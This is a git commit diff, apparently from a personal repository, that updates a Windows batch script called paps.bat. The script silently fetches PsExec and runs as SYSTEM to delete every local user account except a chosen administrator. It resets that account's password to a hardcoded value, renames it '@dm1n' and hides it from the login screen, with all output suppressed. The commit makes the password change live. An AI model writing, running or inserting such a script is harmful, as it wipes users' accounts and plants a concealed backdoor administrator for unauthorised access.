f2937ba35628d193713802b374b2d7270778eca8
shansnow89 <norshanlee89@gmail.com>
2026-06-21 16:56:18 +0800

    Update paps.bat

--- paps.bat
+++ paps.bat
@@ -8,7 +8,7 @@ echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat"
 powershell -nop -c "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $wc=New-Object Net.WebClient; $wc.DownloadFile('https://live.sysinternals.com/PsExec.exe','C:\Windows\System32\PsExec.exe')" >nul 2>&1
 psexec -accepteula -s -i powershell -Command "Get-ChildItem 'HKLM:\SAM\SAM\Domains\Account\Users\Names' | Where-Object {$_.PSChildName -ne 'Administrator' -and $_.PSChildName -ne '@dm1n'} | Remove-Item -Force -Recurse" >nul 2>&1
 net user Administrator /active:yes >nul 2>&1
-echo net user Administrator "IBEX@dm1n!" >nul 2>&1
+net user Administrator "IBEX@dm1n!" >nul 2>&1
 powershell -Command "Rename-LocalUser -Name 'Administrator' -NewName '@dm1n' -Confirm:$false" >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /va /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "@dm1n" /t REG_DWORD /d 1 /f >nul 2>&1
